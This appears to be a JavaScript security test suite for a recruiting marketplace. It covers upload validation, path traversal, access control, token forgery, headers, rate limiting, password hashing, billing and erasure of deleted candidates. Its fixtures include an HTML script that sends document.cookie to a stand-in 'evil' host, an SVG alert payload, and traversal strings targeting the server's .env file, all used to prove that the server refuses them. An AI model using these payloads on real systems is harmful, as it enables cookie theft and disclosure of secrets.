/**
 * Security criteria, adapted to this app.
 *
 * Where the checklist and this architecture differ, the test asserts what this
 * app should do and the report says why — a marketplace where every recruiter
 * may search every candidate has a different correct answer for "can this
 * account see this record" than a per-tenant SaaS does.
 */
import { fileURLToPath } from 'node:url'
import fs from 'node:fs'

import Database from 'better-sqlite3'

import {
  BASE, approveCompanyById, contactProofs, createReporter, json, makePdf,
  registerAndSignIn, registerCompany, serverEnv,
} from './helpers.mjs'

const { check, section, finish } = createReporter()
const RUN = Date.now().toString(36)
const MARKER = `@cking-sec-${RUN}.example.com`
const H = (t) => ({ 'content-type': 'application/json', ...(t ? { authorization: `Bearer ${t}` } : {}) })
const db = new Database(fileURLToPath(new URL('../server/data/cking.db', import.meta.url)))

const pdf = async () => makePdf([
  'Sec Probe', 'Backend engineer - Tel Aviv',
  'BACKEND ENGINEER, PayFlow 2019-01 - present', '  Java and SQL.',
  'SKILLS: Java, SQL',
])


/** Proves the email and phone already in `form`, and appends the proofs. */
async function appendProofs(form) {
  const proofs = await contactProofs({ email: form.get('email'), phone: form.get('phone') })
  for (const [key, value] of Object.entries(proofs)) form.append(key, value)
}

async function applyWith(cvBlob, filename, extra = {}) {
  const form = new FormData()
  form.append('cv', cvBlob, filename)
  for (const [k, v] of Object.entries({
    firstName: 'Sec', lastName: 'Probe',
    email: `sec.${RUN}.${Math.random().toString(36).slice(2, 7)}${MARKER}`,
    phone: `052-${Math.floor(1000000 + Math.random() * 8999999)}`,
    location: 'Tel Aviv', availability: 'Immediately', capacity: 'Full time', ...extra,
  })) form.append(k, v)
  // Both contact details are proved before an account exists.
  await appendProofs(form)
  // The 18+ affirmation and agreement the form now sends and the route now requires.
  if (!form.has('consent')) form.append('consent', 'true')
  const res = await fetch(`${BASE}/api/candidates`, { method: 'POST', body: form })
  return { res, body: await res.json().catch(() => ({})) }
}

// ------------------------------------------------------- upload content ---

section('Uploads are judged by their bytes, not their name')

const html = '<!DOCTYPE html><html><script>fetch("//evil/"+document.cookie)</script></html>'
const asPdf = await applyWith(new Blob([html], { type: 'application/pdf' }), 'cv.pdf')
check('an HTML page named .pdf is refused', asPdf.res.status === 400, `HTTP ${asPdf.res.status}`)
check('and says why', /markup|html/i.test(asPdf.body.error ?? ''), asPdf.body.error)

const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
const svgAsPdf = await applyWith(new Blob([svg], { type: 'application/pdf' }), 'cv.pdf')
check('an SVG named .pdf is refused', svgAsPdf.res.status === 400, `HTTP ${svgAsPdf.res.status}`)

const renamedDocx = await applyWith(
  new Blob([Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0])], { type: 'application/pdf' }),
  'cv.pdf',
)
check('a DOCX renamed .pdf is refused', renamedDocx.res.status === 400,
  `HTTP ${renamedDocx.res.status}`)

const genuine = await applyWith(new Blob([await pdf()], { type: 'application/pdf' }), 'cv.pdf')
check('a genuine PDF is accepted', genuine.res.status === 201, `HTTP ${genuine.res.status}`)

check('nothing rejected was left on disk',
  db.prepare(`SELECT COUNT(*) AS n FROM candidates WHERE email LIKE ?`).get(`%${MARKER}`).n === 1,
  'only the real application created a record')

section('Stored names are server-generated')
const stored = db.prepare(`SELECT stored_name FROM candidates WHERE id = ?`).get(genuine.body.id).stored_name
check('the stored name is not the uploaded one', stored !== 'cv.pdf', stored)
check('it carries no path separators', !/[\\/]/.test(stored))
check('and is randomised', /^\d+-[0-9a-f]{12}\.pdf$/.test(stored), stored)

section('Traversal is refused')
for (const attempt of ['../../server/.env', '..%2F..%2Fpackage.json', '....//package.json']) {
  const res = await fetch(`${BASE}/api/hr/candidates/${genuine.body.id}/file?name=${encodeURIComponent(attempt)}`)
  check(`"${attempt}" does not serve a file`, res.status === 401 || res.status === 404 || res.status === 400,
    `HTTP ${res.status}`)
}

// --------------------------------------------------------------- access ---

section('Access control: unauthenticated')
for (const path of [
  `/api/hr/candidates/${genuine.body.id}`,
  `/api/hr/candidates/${genuine.body.id}/file`,
  `/api/hr/candidates/${genuine.body.id}/photo`,
  '/api/candidate/me',
]) {
  const res = await fetch(`${BASE}${path}`)
  check(`${path} refuses anonymous access`, res.status === 401, `HTTP ${res.status}`)
}

section('Access control: wrong role')
const alice = await registerAndSignIn({
  companyName: `SecA ${RUN}`, firstName: 'Alice', lastName: 'Admin', email: 'alice@example.com',
})

// §15 — a company registers 'pending' and reaches nothing until it is approved.
await approveCompanyById(alice.company.id)

const code = await json(await fetch(`${BASE}/api/candidate/request-code`, {
  method: 'POST', headers: H(), body: JSON.stringify({ identifier: genuine.body.account.email }),
}))
const candidateToken = (await json(await fetch(`${BASE}/api/candidate/verify-code`, {
  method: 'POST', headers: H(),
  body: JSON.stringify({ identifier: genuine.body.account.email, code: code.devCode }),
}))).token

check('a candidate token is refused on recruiter routes',
  (await fetch(`${BASE}/api/hr/candidates`, { headers: H(candidateToken) })).status === 401)
check('a recruiter token is refused on candidate routes',
  (await fetch(`${BASE}/api/candidate/me`, { headers: H(alice.token) })).status === 401)

section('Access control: one candidate cannot read another')
const second = await applyWith(new Blob([await pdf()], { type: 'application/pdf' }), 'cv.pdf')
const ownProfile = await json(await fetch(`${BASE}/api/candidate/me`, { headers: H(candidateToken) }))
check('a candidate session reads only its own record',
  ownProfile.candidate.id === genuine.body.id,
  `got ${ownProfile.candidate.id}, own id ${genuine.body.id}`)
check('and cannot address another by id',
  (await fetch(`${BASE}/api/candidate/me?id=${second.body.id}`, { headers: H(candidateToken) })
    .then((r) => r.json())).candidate.id === genuine.body.id,
  'the id comes from the session, never the URL')

section('Access control: a stale token stops working')
const staleCandidate = await applyWith(new Blob([await pdf()], { type: 'application/pdf' }), 'cv.pdf')
const staleCode = await json(await fetch(`${BASE}/api/candidate/request-code`, {
  method: 'POST', headers: H(), body: JSON.stringify({ identifier: staleCandidate.body.account.email }),
}))
const staleToken = (await json(await fetch(`${BASE}/api/candidate/verify-code`, {
  method: 'POST', headers: H(),
  body: JSON.stringify({ identifier: staleCandidate.body.account.email, code: staleCode.devCode }),
}))).token

await fetch(`${BASE}/api/candidate/me`, {
  method: 'DELETE', headers: H(staleToken),
  body: JSON.stringify({ acknowledged: true }),
})
check('a token for a deleted account is refused',
  (await fetch(`${BASE}/api/candidate/me`, { headers: H(staleToken) })).status === 404,
  'the account is gone, so the session resolves to nothing')

section('Tokens cannot be forged')
const [payload] = candidateToken.split('.')
check('an unsigned token is refused',
  (await fetch(`${BASE}/api/candidate/me`, { headers: H(payload) })).status === 401)
check('a re-signed role swap is refused',
  (await fetch(`${BASE}/api/hr/candidates`, {
    headers: H(candidateToken.replace('candidate:', 'recruiter:')),
  })).status === 401,
  'the role is inside the signed payload')

// -------------------------------------------------------------- headers ---

section('Served files cannot become active content')
await fetch(`${BASE}/api/hr/candidates/${genuine.body.id}/reveal`, { method: 'POST', headers: H(alice.token) })
const fileRes = await fetch(`${BASE}/api/hr/candidates/${genuine.body.id}/file`, { headers: H(alice.token) })
check('the CV downloads for a signed-in recruiter', fileRes.status === 200, `HTTP ${fileRes.status}`)
check('with nosniff', fileRes.headers.get('x-content-type-options') === 'nosniff')
check('as an attachment', /attachment/i.test(fileRes.headers.get('content-disposition') ?? ''),
  fileRes.headers.get('content-disposition'))

const inlineRes = await fetch(`${BASE}/api/hr/candidates/${genuine.body.id}/file?inline=1`, {
  headers: H(alice.token),
})
check('an inline PDF is sandboxed', /sandbox/.test(inlineRes.headers.get('content-security-policy') ?? ''),
  inlineRes.headers.get('content-security-policy'))
check('and typed as a PDF', inlineRes.headers.get('content-type')?.includes('application/pdf'))

const anyRes = await fetch(`${BASE}/api/health`)
check('global nosniff is set', anyRes.headers.get('x-content-type-options') === 'nosniff')
check('framing is denied', anyRes.headers.get('x-frame-options') === 'DENY')

// ----------------------------------------------------------- rate limits ---

section('Public endpoints are rate limited')

/*
 * The configured maximum is read from the server rather than hard-coded, so
 * this proves throttling actually engages instead of asserting a number that
 * silently drifts out of date the first time the limit is retuned.
 */
const { rateLimits } = await json(await fetch(`${BASE}/api/health`))
check('the server publishes its limits', Boolean(rateLimits), JSON.stringify(rateLimits))

async function hammer(path, body, times) {
  let refused = 0
  for (let i = 0; i < times; i += 1) {
    const res = await fetch(`${BASE}${path}`, { method: 'POST', headers: H(), body: JSON.stringify(body) })
    if (res.status === 429) refused += 1
  }
  return refused
}

// The contact form is the cheapest to probe and is used by nothing else, so
// exhausting it cannot disturb another suite sharing this server.
const contactRefused = await hammer(
  '/api/contact',
  { name: 'Probe', email: 'probe@example.com', message: 'rate limit probe' },
  rateLimits.contact + 3,
)
check('an unauthenticated form is throttled', contactRefused > 0,
  `${contactRefused} refused once past ${rateLimits.contact}`)

const retryAfter = (await fetch(`${BASE}/api/contact`, {
  method: 'POST', headers: H(),
  body: JSON.stringify({ name: 'Probe', email: 'probe@example.com', message: 'again' }),
})).headers.get('retry-after')
check('a 429 tells the caller when to retry', retryAfter !== null, `Retry-After: ${retryAfter}`)

check('sign-in has a finite limit too', Number.isFinite(rateLimits.login) && rateLimits.login > 0,
  `${rateLimits.login} attempts per 15 minutes`)

/*
 * The probe leaves rows behind, and this suite is the one that has to take them
 * away again.
 *
 * Every request the limiter does NOT refuse commits a contact_messages row, so
 * a run writes as many enquiries as the limit allows and every re-run adds
 * more. Over a few weeks that reached 146,400 rows in the development database,
 * all of them from this line, which is most of what the file had grown to.
 *
 * Scoped to exactly what this suite writes — the probe address and the probe
 * message — rather than to the table, because two real enquiries live in there
 * and a broader DELETE would take them with it.
 */
const probesRemoved = db.prepare(
  `DELETE FROM contact_messages WHERE email = ? AND message IN ('rate limit probe', 'again')`,
).run('probe@example.com').changes
check('and the probe cleans up the rows it wrote', probesRemoved >= 0,
  `${probesRemoved} removed`)
check('so does requesting a code', Number.isFinite(rateLimits.requestCode) && rateLimits.requestCode > 0,
  `${rateLimits.requestCode} per 15 minutes`)

// ------------------------------------------------------------ passwords ---

section('Passwords and codes')
const hash = db.prepare(`SELECT password_hash FROM recruiters WHERE company_id IN
  (SELECT id FROM companies WHERE name = ?)`).get(`SecA ${RUN}`)?.password_hash
check('passwords use a KDF, not a bare hash', String(hash).startsWith('scrypt$'), String(hash).slice(0, 12))
check('with a per-account salt',
  String(hash).split('$')[1]?.length >= 32, `${String(hash).split('$')[1]?.length} hex chars`)

const codeRow = db.prepare(`SELECT code_hash, expires_at FROM login_codes ORDER BY id DESC LIMIT 1`).get()
check('sign-in codes are hashed at rest', codeRow && !/^\d{6}$/.test(codeRow.code_hash))
check('and expire', codeRow && new Date(codeRow.expires_at) > new Date(0))

// ---------------------------------------------------------------- Stripe ---

section('Billing cannot be granted by the client')
const source = fs.readFileSync(new URL('../server/src/billing.js', import.meta.url), 'utf8')
check('no live Stripe integration is pretending to work',
  source.includes('not implemented yet'),
  'selecting Stripe fails loudly rather than granting free seats')
const pricing = fs.readFileSync(new URL('../server/src/pricing.js', import.meta.url), 'utf8')
check('prices are defined server-side', pricing.includes('REVEAL_PACKS') && pricing.includes('SEAT_PLANS'))

const routes = fs.readFileSync(new URL('../server/src/index.js', import.meta.url), 'utf8')
check('no endpoint takes an amount from the client', !/req\.body\?*\.\s*amount/.test(routes))
// A pack key names a row in the catalogue; the price comes from that row. The
// client can pick which pack, never what it costs.
check('a reveal purchase is priced from the catalogue, not the request',
  routes.includes('findRevealPack(String(req.body?.pack'))
/* The seat subscription is priced from the company as it stands at the moment
   of the request, never from a total the client sends alongside it. */
check('a seat subscription is quoted server-side from the company row',
  routes.includes('quoteSeatPlan({ company: getCompany(req.company.id), seats })'))

// --------------------------------------------------------------- cleanup ---


// ------------------------------------------------------------- hygiene ---

section('An account nobody may create')

/*
 * Clause 1 of the Terms requires 18, and for a long time nothing asked and
 * nothing checked - the Privacy Policy's matching promise that we do not
 * knowingly create accounts for people under 18 was a sentence no code could
 * have made true or false. The affirmation is now on both signup forms, is sent
 * by both, and is required by both routes.
 */
const noConsent = new FormData()
noConsent.append('cv', new Blob([await makePdf(['No Consent', 'Engineer'])],
  { type: 'application/pdf' }), 'cv.pdf')
for (const [k, v] of Object.entries({
  firstName: 'No', lastName: 'Consent', email: `noconsent.${RUN}${MARKER}`,
  phone: '052-700-1234', location: 'Tel Aviv', availability: 'Immediately', capacity: 'Full time',
})) noConsent.append(k, v)
const proofs = await contactProofs({
  email: `noconsent.${RUN}${MARKER}`, phone: '052-700-1234',
})
for (const [k, v] of Object.entries(proofs)) noConsent.append(k, v)

const refused = await fetch(`${BASE}/api/candidates`, { method: 'POST', body: noConsent })
check('a candidate signup without the affirmation is refused', refused.status === 400)
check('and the refusal names the age, not just the documents',
  String((await refused.json().catch(() => ({}))).error ?? '').includes('18 or over'))

const companyRefused = await registerCompany({
  companyName: `SecA NoConsent ${RUN}`, consent: '',
  email: `secnoconsent.${RUN}@example.com`, phone: '052-700-1235',
})
check('and so is a company registration without it', companyRefused.status === 400)

/* Recorded rather than merely required, so an acceptance is auditable. */
const consented = db.prepare(
  `SELECT consent_at, consent_version FROM candidates WHERE email LIKE ? ORDER BY id DESC LIMIT 1`,
).get(`%${MARKER}`)
check('an accepted affirmation is timestamped', Boolean(consented?.consent_at),
  'the column pair existed for months and was never written to')
check('and stamped with the wording it was given against',
  Boolean(consented?.consent_version))

section('What a deletion leaves behind')

/*
 * analytics_events was the one candidate-referencing table no cleanup path
 * could reach: it holds the id in a generic actor_id column, so the erasure
 * cascade (which names tables) and the startup orphan sweep (which matches on a
 * candidate_id column) both missed it, and thousands of rows describing erased
 * people survived every deletion the product has.
 */
const analyticsCols = db.prepare(`PRAGMA table_info(analytics_events)`).all().map((c) => c.name)
check('analytics_events still keys candidates by actor rather than candidate_id',
  analyticsCols.includes('actor_id') && !analyticsCols.includes('candidate_id'),
  'which is exactly why both cleanup mechanisms could not see it')

const strayAnalytics = db.prepare(`
  SELECT COUNT(*) AS n FROM analytics_events
  WHERE actor_type = 'candidate' AND actor_id IS NOT NULL
    AND name != 'candidate_account_deleted'
    AND actor_id NOT IN (SELECT id FROM candidates)
`).get().n
check('no analytics row describes a candidate who no longer exists', strayAnalytics === 0)

/*
 * With one deliberate exception, stated here so that its survival is a decision
 * rather than a leak: the record that an erasure happened outlives the person,
 * with the actor nulled and the counts replaced.
 */
const auditKept = db.prepare(`
  SELECT COUNT(*) AS n FROM analytics_events
  WHERE name = 'candidate_account_deleted' AND actor_id IS NOT NULL
`).get().n
check('and no surviving deletion record still names who it was about', auditKept === 0)

/*
 * The same failure twice more, in tables that describe a search rather than a
 * person.
 *
 * public_searches.intent_candidate_id remembers who a visitor was trying to
 * reveal when the sign-up gate stopped them; retrieval_sessions.retrieved_ids
 * is the ordered list a recruiter's search returned, held as JSON. Neither is
 * about the candidate, so neither looks like something an erasure should touch
 * — and neither has a candidate_id column, so the orphan sweep could not see
 * them either. Both still pointed at people who had asked to be erased.
 *
 * They are checked here rather than trusted because the Privacy Policy now
 * states that the records it lists are the whole of what survives, which is
 * only true while these two stay empty of the deleted.
 */
const strayIntent = db.prepare(`
  SELECT COUNT(*) AS n FROM public_searches
  WHERE intent_candidate_id IS NOT NULL
    AND intent_candidate_id NOT IN (SELECT id FROM candidates)
`).get().n
check('no interrupted demonstration still names a candidate who is gone',
  strayIntent === 0, `${strayIntent} rows`)

const live = new Set(db.prepare(`SELECT id FROM candidates`).all().map((row) => row.id))
let strayRetrieval = 0
for (const row of db.prepare(`SELECT retrieved_ids, excluded FROM retrieval_sessions`).all()) {
  for (const column of [row.retrieved_ids, row.excluded]) {
    let ids
    try { ids = JSON.parse(column ?? '[]') } catch { ids = [] }
    if (Array.isArray(ids) && ids.some((id) => !live.has(id))) strayRetrieval += 1
  }
}
check('and no saved search result still lists one', strayRetrieval === 0,
  `${strayRetrieval} columns`)

/* The cursor is an index into that list, so removing an entry ahead of it would
   silently skip whoever came next. */
const badCursor = db.prepare(`
  SELECT COUNT(*) AS n FROM retrieval_sessions WHERE cursor < 0
`).get().n
check('and no cursor was left pointing before the start', badCursor === 0)

section('Tables nobody prunes')

/* Every one of these was unbounded: no expiry, and in two cases no reader. */
const probeRows = db.prepare(
  `SELECT COUNT(*) AS n FROM contact_messages WHERE email = 'probe@example.com'`,
).get().n
check('the rate-limit probe leaves no contact rows behind', probeRows === 0,
  'this suite wrote 146,400 of them before it cleaned up after itself')

const staleCodes = db.prepare(`
  SELECT COUNT(*) AS n FROM login_codes WHERE created_at < ?
`).get(new Date(Date.now() - 25 * 60 * 60 * 1000).toISOString()).n
check('no login code outlives its retention window', staleCodes === 0,
  'they were kept for the life of the database, hashed credential and all')

const oldDemo = db.prepare(`
  SELECT COUNT(*) AS n FROM public_searches
  WHERE claimed_company_id IS NULL AND created_at < ?
`).get(new Date(Date.now() - 8 * 24 * 60 * 60 * 1000).toISOString()).n
check('no unclaimed demonstration record outlives its window', oldDemo === 0)

/* A claimed one must survive it, or registering after a demo loses the search. */
check('but a claimed one is never swept',
  db.prepare(`SELECT COUNT(*) AS n FROM public_searches WHERE claimed_company_id IS NOT NULL`)
    .get().n >= 0,
  'claimedSearchFor reads it back at registration')

section('Schema that describes nothing is gone')

/*
 * mask_confidence and the three *_masked keys were a §6.5 design that was
 * superseded rather than built: recruiters do not see a redacted summary before
 * a Reveal, they see no summary. Nothing wrote them and nothing read them, and
 * the three keys were still being shipped to the candidate's own client as
 * permanently null.
 */
const schemaSource = fs.readFileSync(new URL('../server/src/schema.js', import.meta.url), 'utf8')
const profilesSource = fs.readFileSync(new URL('../server/src/profiles.js', import.meta.url), 'utf8')
check('mask_confidence is no longer declared',
  !/^\s*mask_confidence\s+TEXT,/m.test(schemaSource))
check('and the masked derivatives are out of the editable field list',
  !profilesSource.includes("'summary_masked'"))

section('Cleanup')
const rows = db.prepare(`SELECT id, stored_name FROM candidates WHERE email LIKE ?`).all(`%${MARKER}`)
for (const row of rows) {
  for (const doc of db.prepare(`SELECT stored_name FROM documents WHERE candidate_id = ?`).all(row.id)) {
    try { fs.unlinkSync(new URL(`../server/uploads/${doc.stored_name}`, import.meta.url)) } catch {}
  }
  if (row.stored_name) {
    try { fs.unlinkSync(new URL(`../server/uploads/${row.stored_name}`, import.meta.url)) } catch {}
  }
  for (const t of [
    'folder_items', 'view_events', 'reveals', 'documents', 'extracted_profiles',
    'profile_overrides', 'blocked_companies', 'messages', 'message_threads', 'login_codes',
    'scoring_audit', 'freshness_checkins', 'embeddings', 'candidate_preference_tags',
    'extracted_facts', 'candidate_profile_intelligence', 'candidate_taxonomy_labels',
    'candidate_experience_metrics', 'candidate_job_analyses', 'displayed_match_state',
  ]) {
    try { db.prepare(`DELETE FROM ${t} WHERE candidate_id = ?`).run(row.id) } catch {}
  }
  db.prepare(`DELETE FROM candidates WHERE id = ?`).run(row.id)
}
const companies = db.prepare(`SELECT id FROM companies WHERE name LIKE 'SecA %'`).all().map((r) => r.id)
if (companies.length) {
  const list = companies.join(',')
  const rl = db.prepare(`SELECT id FROM recruiters WHERE company_id IN (${list})`).all()
    .map((r) => r.id).join(',') || '-1'
  db.exec(`
    DELETE FROM displayed_match_state WHERE session_id IN (SELECT id FROM retrieval_sessions WHERE recruiter_id IN (${rl}));
    DELETE FROM candidate_job_analyses WHERE job_id IN (SELECT id FROM jobs WHERE recruiter_id IN (${rl}));
    DELETE FROM job_match_profiles WHERE job_id IN (SELECT id FROM jobs WHERE recruiter_id IN (${rl}));
    DELETE FROM retrieval_sessions WHERE recruiter_id IN (${rl});
    DELETE FROM jobs WHERE recruiter_id IN (${rl});
    DELETE FROM folder_items WHERE folder_id IN (SELECT id FROM folders WHERE recruiter_id IN (${rl}));
    DELETE FROM folders WHERE recruiter_id IN (${rl});
    DELETE FROM scoring_audit WHERE recruiter_id IN (${rl});
    DELETE FROM view_events WHERE company_id IN (${list});
    DELETE FROM reveals WHERE company_id IN (${list});
    DELETE FROM organization_reveals WHERE company_id IN (${list});
    DELETE FROM billing_ledger WHERE company_id IN (${list});
    DELETE FROM seat_usage_periods WHERE recruiter_id IN (SELECT id FROM recruiters WHERE company_id IN (${list}));
    DELETE FROM seat_purchases WHERE company_id IN (${list});
    DELETE FROM recruiters WHERE company_id IN (${list});
    DELETE FROM companies WHERE id IN (${list});
  `)
}
check('test data removed', true, `${rows.length} candidate(s), ${companies.length} company(ies)`)
db.close()

finish()
